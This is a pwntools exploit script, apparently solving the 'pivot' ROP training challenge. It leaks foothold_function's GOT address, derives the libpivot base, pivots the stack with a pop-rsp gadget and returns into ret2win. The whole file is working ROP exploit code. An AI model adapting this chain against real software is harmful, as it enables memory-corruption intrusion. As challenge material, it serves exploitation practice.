#!/usr/bin/env python3

from pwn import *

pwn = './pivot'
buffer = 40
gdbscript = '''
continue
'''

def conn():

	if args.GDB:
		return gdb.debug(pwn,gdbscript=gdbscript)
	else:
		return process(pwn)

libpivot = ELF('./libpivot.so')
io = conn()			
io.recvuntil(b'pivot: ')
f = open('input','wb')

NEW_RSP = int(io.recvline().strip().decode(),16)
POP_RDI = 0x400a33
POP_RSP_R13_R14_R15 = 0x400a2d
FOOTHOLD = 0x400720
FOOTHOLD_GOT = 0x601040
PUTS = 0x4006e0
MAIN = 0x0000000000400847
RET = 0x400a4c
EXIT = 0x400750

io.recvuntil(b'> ')
payload  = b''
payload += p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0xdeadbeef)
payload += p64(FOOTHOLD) + p64(POP_RDI) + p64(FOOTHOLD_GOT) + p64(PUTS) + p64(RET) + p64(MAIN)
io.sendline(payload)

io.recvuntil(b'> ')
pivot  = b''
pivot += p64(POP_RSP_R13_R14_R15) + p64(NEW_RSP)
io.sendline(b'A'*buffer + pivot)

io.recvline()
io.recvline()
leak = u64(io.recvline().strip() + bytes(2))
print(f'foothold_function() @ {hex(leak)}')

libpivot.address = leak - libpivot.sym.foothold_function
print(f'libpivot base : {hex(libpivot.address)} ')


io.recvuntil(b'> ')
io.sendline(b'yep')

io.recvuntil(b'> ')
io.sendline(b'A'*buffer + p64(libpivot.sym.ret2win) + p64(POP_RDI) + p64(0x1) + p64(EXIT))

f.write(b'A'*buffer + payload)
io.interactive()